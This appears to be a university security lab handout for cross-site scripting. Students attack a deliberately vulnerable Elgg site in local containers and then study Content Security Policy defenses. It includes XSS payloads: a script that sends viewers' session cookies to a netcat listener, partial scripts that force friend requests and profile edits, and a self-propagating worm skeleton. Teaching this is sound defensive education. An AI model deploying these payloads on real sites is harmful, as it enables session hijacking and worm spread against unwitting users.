---
layout: default
course_number: CS335
title: Lab - XSS
---

# Lab: Cross-Site Scripting (XSS)

## Learning Objectives

Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications. This vulnerability allows attackers to inject malicious code (e.g., JavaScript) into a victim's web browser. Using this malicious code, attackers can steal a victim's credentials, such as session cookies. The access control policies (i.e., the Same-Origin Policy) enforced by browsers can be bypassed by exploiting XSS vulnerabilities.

To demonstrate what attackers can do by exploiting XSS vulnerabilities, we have set up a web application named **Elgg** in a pre-built Ubuntu VM image. Elgg is a popular open-source social networking application, and it includes several countermeasures against XSS attacks. In this lab, we have intentionally disabled these countermeasures to make the application vulnerable. As a result, users can post arbitrary content, including JavaScript code, in their profiles.

In this lab, students will exploit this vulnerability to launch XSS attacks against the modified Elgg application, similar to what Samy Kamkar did in 2005 with the Samy worm on MySpace. The ultimate goal is to create a self-propagating XSS worm: when a user views an infected profile, they become infected, and the worm automatically adds the attacker as a friend.

### Topics Covered

- Cross-Site Scripting (XSS) attacks  
- XSS worms and self-propagation  
- Session cookies  
- HTTP GET and POST requests  
- JavaScript and AJAX  
- Content Security Policy (CSP)  

---

## Lab Environment 
Setup files: [Labsetup.zip](.\xss\Labsetup.zip)

### DNS Setup
Several websites are used in this lab, all hosted on the container with IP address `10.9.0.5`. Add the following entries to `/etc/hosts` (root privileges required):
```bash 
10.9.0.5 www.seed-server.com
10.9.0.5 www.example32a.com
10.9.0.5 www.example32b.com
10.9.0.5 www.example32c.com
10.9.0.5 www.example60.com
10.9.0.5 www.example70.com
```

### Elgg Web Application

We use the open-source web application **Elgg** for this lab. It is already installed in the provided container images and can be accessed at:

`http://www.seed-server.com`

The setup uses two containers:

- Web server: `10.9.0.5`  
- MySQL database: `10.9.0.6`  

**Important:** These IP addresses are hardcoded in the configuration. Do not modify them in the `docker-compose.yml` file.

### MySQL Database Persistence
Containers are typically disposable, meaning that once a container is removed, all data stored inside it is lost. However, for this lab we want to preserve the data in our MySQL database so that our work remains intact even after shutting down the container.

To accomplish this, we mount the MySQL data directory on the host machine (inside the *Labsetup* folder). This directory is automatically created after the MySQL container runs for the first time. It is mapped to `/var/lib/mysql` inside the container, which is where MySQL stores its database files. Because the data now lives on the host, it persists even if the container is destroyed.

If you ever want to reset the environment and start with a clean database, you can simply remove the data directory:

```bash 
sudo rm -rf mysql_data
```

### User Accounts

| Username | Password    |
| -------- | ----------- |
| admin    | seedelgg    |
| alice    | seedalice   |
| boby     | seedboby    |
| charlie  | seedcharlie |
| samy     | seedsamy    |

---

## Ethical Use Notice
This lab is intended **solely for educational use within a controlled environment**. The techniques demonstrated must **never** be used on systems you do not own or lack explicit authorization to test.

---

## Lab Tasks
When you copy and paste code between different programs or environments, the quotation marks—especially single quotes—sometimes get changed into similar‑looking symbols. These “fancy” quotes look almost the same, but they are not valid in code and will cause errors.

If you notice this happening, simply delete the incorrect quotes and type the regular ones manually on your keyboard. This small step can save you a lot of debugging time.

### Task 1: Display an Alert Window

Embed a JavaScript program in your Elgg profile so that when another user views it, an alert window appears.

Example:
```html
<script>alert('XSS');</script>
```

If the script is too long for the input field, you can host host it externally:

Example: 
```html
<script type="text/javascript" src="http://www.example.com/myscripts.js"></script>
```

**Questions**: 
- Why does the browser execute this script?
- What assumption does the web application violate?

### Task 2: Display Cookies

Modify your script so it displays the viewer's cookies in an alert box.

Example: 
```html
<script>alert(document.cookie);</script>
```

### Task 3: Steal Cookies

Instead of showing cookies, send them to your attacker machine.

Use an `<img>` tag with a URL pointing to your machine so the browser sends a GET request containing the cookie.

Example:

```html
<script>
document.write('<img src="http://10.9.0.1:8090?cookie=' + escape(document.cookie) + '">');
</script>
```

Run a listener to capture the data:
```bash 
nc -lknv 8090
```

Options:
- `-l`: listen mode
- `-k`: keep listening after connections
- `-n`: numeric IPs only
- `-v`: verbose 

**Questions**:
- Why does the browser send a request automatically?
- What role does the `<img>` tag play?

### Task 4: Add a Friend (Samy)

Capture what a normal "Add Friend" request looks like using HTTP Header tools, the browser developer tools or Wireshark. Identify:
- URL
- Parameters
- Security tokens

Write JavaScript that automatically sends this request from the victim's browser. Insert this script into Samy's profile so anyone who views it unknowingly adds Samy as a friend.

Example: 

```html
<script>
window.onload = function () {
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var sendurl = ...; // FILL IN

    var Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```

**Important**: Use Text mode (not Editor mode) when inserting code into the "About Me" field.

**Questions**:
- Why are `__elgg_ts` and `__elgg_token` required?
- Why does this request succeed without user interaction?

### Task 5: Modify the Victim's Profile

Observe how Elgg sends a profile‑update request.

Write JavaScript that sends the same POST request, changing the victim's "About Me" section.

Add this script to Samy's profile so it runs when victims visit.

```html
<script>
window.onload = function() {
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    var content = ...;   // FILL IN
    var samyGuid = ...;  // FILL IN
    var sendurl = ...;   // FILL IN

    if (elgg.session.user.guid != samyGuid) {
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
``` 

**Questions:**
- What prevents infinite self-modification?
- How does the attack maintain persistence?

### Task 6: Self-Propagating XSS Worm

Make your attack replicate itself. When a victim's profile is modified, your script should also copy itself into their profile.

Two approaches (**both are required**):
- Link-Based  method: Use a `<script src="...">` pointing to your hosted worm.
- DOM method: Have the script read its own code and insert it into the victim's profile.

**Approach 1:** Link-Based Example 
```html
<script src="http://www.example.com/xss_worm.js"></script>
```

**Approach 2:** DOM-Based Example

```html
<script id="worm">
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML;
var tailTag = "</" + "script>";
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

alert(jsCode);
</script>
```

Note: `innerHTML` does not include the `<script>` tags, so they must be added manually.

**Questions:**
- Why must `<script>` tags be reconstructed manually?
- What encoding issues arise?
- Compare both propagation methods (Link-Based vs DOM-Based):
  - stealth
  - reliability
  - detectability
  - 
### Elgg Countermeasures (Reference Only)

Elgg normally protects against XSS using:
- `HTMLawed` (input filtering)
- `htmlspecialchars()` (output encoding)

These have been disabled in this lab.

Example modification:

```php
function filter_tags($var) {
    // return elgg_trigger_plugin_hook('validate', 'input', null, $var);
    return $var;
}
```

### Task 7: Defeating XSS Using CSP (Content Security Policy)
XSS occurs because HTML allows code and data to mix. CSP (Content Security Policy) helps separate them by restricting where scripts can be loaded from. CSP works by telling the browser what it is allowed to load. You set these rules using a CSP header, either in Apache or PHP.

#### Experiment Setup
To experiment with CSP, we will set up several small websites. Inside the `Labsetup/image_www` Docker image folder, you'll find a file named `apache_csp.conf`. This configuration file defines five different websites. All of them share the same directory on disk, but each site uses different files from that directory.
- Two of the sites — `example60` and `example70` — are used to host JavaScript files that your CSP rules may allow or block.
- The other three sites — `example32a`, `example32b`, and `example32c` — are the main pages you will test. Each one has a different CSP configuration, allowing you to compare how various policies affect script execution.

When working on this experiment, you will need to modify the Apache configuration file apache_csp.conf. You can update this file in two different ways:

**1. Edit the file in the image folder:**
If you change the configuration file directly inside the Docker image folder (before the container is built), you must:
- Rebuild the Docker image
- Restart the container

Only then will your changes take effect.

**2. — Edit the file inside the running container**
You can also modify the configuration file while the container is already running. The main limitation is that, to keep the image small, the container only includes a basic text editor: `nano`. It's simple but perfectly fine for small edits. If you prefer another editor, you can add an installation command to the Dockerfile and rebuild the image.

Inside the running container, the configuration file is located at:

`/etc/apache2/sites-available/apache_csp.conf`

After making changes, you must restart Apache so it reloads the updated configuration:

`service apache2 restart`

#### CSP Configuration Examples

**Apache Configuration (CSP Header)**
Apache can add HTTP headers to every response it serves, which makes it a convenient place to define CSP policies. In our setup, we created three websites, but only the second one includes CSP rules. Because of this, whenever we visit `example32b`, Apache automatically attaches the specified CSP header to every response from that site. This allows us to observe how the browser behaves when CSP is enforced at the server level.

```
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32b.com
    DirectoryIndex index.html
    Header set Content-Security-Policy " \
            default-src 'self'; \
            script-src 'self' *.example70.com \
        "
</VirtualHost>
```

**PHP Configuration:**

Some pages in the lab send CSP headers using PHP instead of Apache. This helps you see how developers can enforce CSP directly in their application code. For the third VirtualHost entry in the configuration file, no CSP policy is defined at the Apache level. Instead of serving `index.html` like the other sites, this VirtualHost uses `phpindex.php` as its entry point. This file is a PHP script, and it adds its own CSP header directly in the HTTP response. In other words, even though Apache does not set a CSP policy for this site, the PHP program itself applies one when generating the page.

```php
<?php
    $cspheader = "Content-Security-Policy:".
                "default-src 'self';".
                "script-src 'self' 'nonce-111-111-111' *.example70.com".
                "";
    header($cspheader);
?>

<?php include 'index.html';?>
```

### Task Instructions

Visit the Three Demo Pages:
```
http://www.example32a.com
http://www.example32b.com
http://www.example32c.com
```
Each page has a different CSP rule set.
Your job is to observe:
- Which scripts run successfully
- Which scripts are blocked
- What errors appear in the browser console

This shows how CSP affects JavaScript execution.

Answer the following:

- Describe and explain your observations.
- Click the button on each page and explain what happens.
- Modify `example32b`  (modify the Apache configuration) so Areas 5 and 6 display OK.
- Modify `example32c`  (modify the PHP code) so Areas 1, 2, 4, 5, and 6 display OK.
- Explain why CSP helps prevent XSS attacks.

## Grading

- Post your report in <a href="https://cs.ycp.edu/marmoset" target="_blank">Marmoset</a> by the scheduled due date in the syllabus. Your grade for this lab will be composed of:
- You need to submit a detailed lab report, with **screenshots**, to describe what you have done and what you have observed. You also need to provide explanation to the observations that are interesting or surprising. Please also list the important code snippets followed by explanation. Simply attaching code without any explanation will not receive credits.
  - 30% - Design:  The overall quality and structure of your exploit.
  - 30% - Observations: Insightfulness and depth in your understanding of the task
  - 40% - Explanation: Clarity and completeness of your report and analysis.
  - *Extra Credit*: Additional investigation beyond the requirements.
